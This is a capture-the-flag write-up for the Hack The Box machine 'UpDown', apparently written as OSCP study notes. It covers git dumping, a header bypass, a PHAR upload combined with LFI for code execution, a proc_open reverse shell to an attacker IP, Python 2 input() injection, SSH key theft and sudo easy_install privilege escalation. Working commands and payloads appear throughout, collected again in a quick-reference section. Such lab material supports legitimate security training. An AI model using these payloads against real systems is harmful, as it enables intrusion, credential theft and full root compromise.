# UpDown — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.129.227.227                 |
| **Hostname** | siteisup.htb, dev.siteisup.htb |
| **OS**       | Linux (Ubuntu 20.04 Focal)     |
| **Difficulty** | Medium                       |
| **Key Skills** | VHost discovery, .git dump, .htaccess header bypass, PHAR file upload bypass, PHP disabled function bypass (proc_open), Python2 input() code injection, Sudo easy_install GTFOBins |

---

## 1. Enumeration

### Nmap
```
PORT   SERVICE   VERSION
22/tcp SSH       OpenSSH 8.2p1 Ubuntu
80/tcp HTTP      Apache 2.4.41 (Ubuntu)
```
Only two ports — tight attack surface, all effort goes into the web app.

### Virtual Host Discovery
```bash
# Add to /etc/hosts
echo "10.129.227.227 siteisup.htb" | sudo tee -a /etc/hosts

# VHost brute force
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs 1131

# Found: dev.siteisup.htb → returns 403 Forbidden
echo "10.129.227.227 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

### Web Application
- **siteisup.htb** — Simple app that checks if a given website is up or down
- **dev.siteisup.htb** — Returns **403 Forbidden** (protected by `.htaccess`)

### Directory Brute Force
```bash
feroxbuster -u http://siteisup.htb -x php
# Found: /index.php, /dev/ (301), /dev/index.php
```

### .git Directory Discovery
```
http://siteisup.htb/dev/.git/   → directory listing enabled
```

> **OSCP Technique — .git on webservers:**
> Always check for `/.git/` on every web app. If directory listing is on, you can dump the entire repo and recover source code, credentials, and deleted files.

---

## 2. Source Code Recovery — Git Dump

### Download the .git repository
```bash
# Method 1: wget (mirror mode)
wget -m -np http://siteisup.htb/dev/.git/

# Method 2: git-dumper (handles non-listed repos too)
git-dumper http://siteisup.htb/dev/.git/ ./updown-source
```

### Restore deleted/staged files
```bash
cd siteisup.htb/dev/

# Files were staged for deletion — restore them
git restore --staged .
git restore .

ls -la
# admin.php
# changelog.txt
# checker.php     ← file upload + URL checking logic
# .htaccess       ← access control (the 403 reason)
# index.php       ← main page with LFI
# stylesheet.css
```

> **OSCP Technique — Git restore deleted files:**
> Developers often `git rm` sensitive files but the history keeps them. Use `git restore` to recover staged deletions, or `git log -p` to see full diffs including old passwords and secrets.

---

## 3. Source Code Analysis — Finding the Attack Path

### .htaccess — Header-Based Access Control
```apache
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
**The dev subdomain requires the header `Special-Dev: only4dev` to access.**

```bash
# Verify access
curl -H "Special-Dev: only4dev" http://dev.siteisup.htb/
```

> **OSCP Technique — .htaccess header bypass:**
> If you recover `.htaccess` from a `.git` dump, read it carefully. `SetEnvIfNoCase` sets access control based on custom headers. Add the header via a browser extension (Modify Header Value) or Burp to bypass the 403.

### index.php — LFI with Filter
```php
// Simplified logic:
if (!preg_match("/bin|usr|home|var|etc/i", $_GET['page'])) {
    include($_GET['page'] . ".php");
}
```
- LFI exists via `?page=` parameter
- Filters block direct paths like `/etc/passwd`
- Appends `.php` automatically — we need a wrapper that handles this

### checker.php — Upload Filtering Logic
```php
// 1. File size limit
if ($_FILES['file']['size'] > 10000) → reject

// 2. Extension blacklist
if preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i") → reject

// 3. Upload to /uploads/<md5(time())>/
move_uploaded_file()

// 4. Read file line-by-line, check each URL
// Blocks: file://, data://, ftp:// schemes

// 5. Delete file after processing
@unlink()
```

**Key findings:**
- `.zip` is blocked but custom extensions (`.0xdf`, `.test`) are **not**
- Files are deleted after processing (`@unlink`) — but crashes/large files may leave them
- Upload directory: `/uploads/<md5_hash>/`
- Cron clears `/uploads/` every 5 minutes as backup cleanup

---

## 4. Initial Foothold — PHAR Upload + LFI to RCE

### The Chain
1. Create a PHP payload inside a ZIP archive with a non-blocked extension
2. Upload it through the checker form (with the `Special-Dev` header)
3. Use the LFI (`?page=`) with `phar://` wrapper to execute the PHP inside the ZIP
4. The `phar://` wrapper reads into the ZIP, and `index.php` appends `.php` to the filename

### Step 1: Test with phpinfo
```bash
# Create PHP file
echo '<?php phpinfo(); ?>' > info.php

# Zip it with a non-blocked extension
zip loded.test info.php
```

### Step 2: Upload via dev subdomain
Upload `loded.test` through the checker form at `http://dev.siteisup.htb/` (with `Special-Dev: only4dev` header set in browser).

Note the upload path from the `/uploads/` directory listing:
```
http://dev.siteisup.htb/uploads/<md5_hash>/loded.test
```

### Step 3: Trigger via PHAR + LFI
```
http://dev.siteisup.htb/?page=phar://uploads/<md5_hash>/loded.test/info
```
- `phar://` reads into the ZIP archive
- `/info` points to `info.php` inside the ZIP
- `index.php` appends `.php` → resolves to `info.php`

**phpinfo loads successfully — we have code execution!**

### Step 4: Identify allowed functions
```bash
# Save the phpinfo HTML page, then scan for bypasses
python3 dfunc-bypasser.py --file phpinfo.html

# Result — NOT disabled:
# proc_open     → can execute commands via pipes
# imap_open     → can execute via rsh/ssh
```

### Step 5: Reverse shell via proc_open
```php
<?php
$descspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'";
$proc = proc_open($cmd, $descspec, $pipes);
?>
```

```bash
# Save as rev.php, zip with non-blocked extension
zip loded.test rev.php

# Start listener
nc -lvnp 443

# Upload, then trigger:
# http://dev.siteisup.htb/?page=phar://uploads/<md5_hash>/loded.test/rev
```

> **OSCP Technique — PHAR file upload bypass:**
> When upload filters block `.php` and `.zip`, use a custom extension (`.test`, `.0xdf`, etc.) for your ZIP. Then use `phar://` to read PHP files from inside it. The chain: **zip the PHP** → **upload with safe extension** → **LFI with phar:// wrapper** → **RCE**.

> **OSCP Technique — PHP disabled functions bypass:**
> When `system()`, `exec()`, `shell_exec()`, `passthru()` are disabled, check for:
> - `proc_open()` — execute via process pipes
> - `pcntl_exec()` — replace current process
> - `imap_open()` — command via mailbox arg
> - `mail()` + `putenv()` — LD_PRELOAD injection
>
> Use `dfunc-bypasser` to automatically find what's available from phpinfo output.

**Shell as:** `www-data`

---

## 5. Lateral Movement — Python2 input() Code Injection

### Discovery
```bash
ls -la /home/developer/dev/
# -rwsr-x--- 1 developer www-data siteisup     ← SUID binary, owner=developer, group=www-data
# -rwxr-x--- 1 developer www-data siteisup_test.py
```

The `siteisup` binary is **SUID** (runs as `developer`) and our `www-data` group can execute it. It runs `siteisup_test.py` which uses **Python 2's `input()`**.

### The Vulnerability
Python 2's `input()` function calls `eval()` on whatever the user types. Python 3's `input()` is safe (equivalent to Python 2's `raw_input()`).

```bash
./siteisup
# Enter URL here: __import__('os').system('id')
# uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

### Exploit — Shell as developer
```bash
./siteisup
# Enter URL here: __import__('os').system('bash')
# developer@updown:~$
```

> **OSCP Technique — Python 2 input() injection:**
> Python 2's `input()` is secretly `eval(raw_input())` — it evaluates the user's input as Python code. If a SUID binary or root service uses Python 2 `input()`:
> ```python
> __import__('os').system('id')          # run a single command
> __import__('os').system('bash')        # spawn a shell
> __import__('os').system('/bin/bash')    # spawn a shell (explicit path)
> ```
> Check the Python version: `python --version`. If it's Python 2.x and uses `input()`, it's exploitable.

### Grab SSH key for stable access
```bash
# developer has an SSH key
cat /home/developer/.ssh/id_rsa
# Copy to attacker, chmod 600, connect:
ssh -i developer_key developer@siteisup.htb
```

**Shell as:** `developer`

---

## 6. Privilege Escalation — Sudo easy_install (GTFOBins)

### Check sudo permissions
```bash
sudo -l
# (ALL) NOPASSWD: /usr/local/bin/easy_install
```

### What is easy_install?
A Python package installer (from setuptools). It executes `setup.py` files — which are just Python scripts. If we can run it as root, we can execute arbitrary Python as root.

### GTFOBins Exploit
```bash
# Create a malicious setup.py
cd /tmp
mkdir privesc && cd privesc
echo 'import os; os.system("/bin/bash")' > setup.py

# Run easy_install as root — it executes setup.py
sudo /usr/local/bin/easy_install .
```

> **OSCP Technique — easy_install / pip sudo privesc:**
> If `easy_install` or `pip install` is in `sudo -l`, it will execute a `setup.py` file as root:
> ```bash
> mkdir /tmp/exploit && cd /tmp/exploit
> echo 'import os; os.system("/bin/bash")' > setup.py
> sudo easy_install .          # or: sudo pip install .
> ```
> Same concept works with `pip install` — both execute arbitrary Python from `setup.py`.

**Shell as:** `root`

---

## 7. Attack Chain Summary

```
VHost Discovery (ffuf)
    |
    v
dev.siteisup.htb (403 Forbidden)
    |
    v
.git dump → .htaccess reveals header: Special-Dev: only4dev
    |
    v
Source code analysis → checker.php upload filter + index.php LFI
    |
    v
PHAR upload bypass (zip as .test) + LFI (?page=phar://...) → phpinfo
    |
    v
Disabled function bypass → proc_open reverse shell → www-data
    |
    v
SUID siteisup binary → Python 2 input() eval → developer
    |
    v
SSH key in /home/developer/.ssh/ → stable shell
    |
    v
sudo easy_install (GTFOBins) → root
```

---

## 8. OSCP Exam Takeaways

| Lesson | Detail |
|--------|--------|
| **Always VHost fuzz** | `ffuf` with `Host:` header found `dev.siteisup.htb` — invisible without it |
| **Dump .git repos completely** | `wget -m` or `git-dumper` — then `git restore` to recover deleted files |
| **.htaccess reveals access controls** | Custom headers, IP restrictions — read it to understand 403s |
| **Read the source code** | `checker.php` showed exact upload filters to bypass |
| **PHAR bypasses extension filters** | ZIP with custom extension + `phar://` wrapper = PHP execution |
| **Disabled functions aren't all-or-nothing** | `proc_open` was left enabled — always scan with dfunc-bypasser |
| **Python 2 input() = eval()** | SUID + Python 2 + `input()` = instant code execution as binary owner |
| **SSH keys = stable access** | Always check `~/.ssh/` after getting user access |
| **easy_install/pip = setup.py execution** | Sudo on package installers = root via malicious setup.py |

---

## 9. Commands Quick Reference

```bash
# VHost discovery
ffuf -w subdomains.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs 1131

# .git dump
wget -m -np http://siteisup.htb/dev/.git/
git restore --staged . && git restore .

# Header bypass (curl)
curl -H "Special-Dev: only4dev" http://dev.siteisup.htb/

# PHAR upload bypass
echo '<?php phpinfo(); ?>' > info.php
zip payload.test info.php
# Upload, then: ?page=phar://uploads/<hash>/payload.test/info

# proc_open reverse shell (when system/exec disabled)
# Use proc_open with /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'

# Disabled function scanner
python3 dfunc-bypasser.py --file phpinfo.html

# Python 2 input() injection
__import__('os').system('bash')

# easy_install GTFOBins privesc
mkdir /tmp/pe && cd /tmp/pe
echo 'import os; os.system("/bin/bash")' > setup.py
sudo /usr/local/bin/easy_install .
```
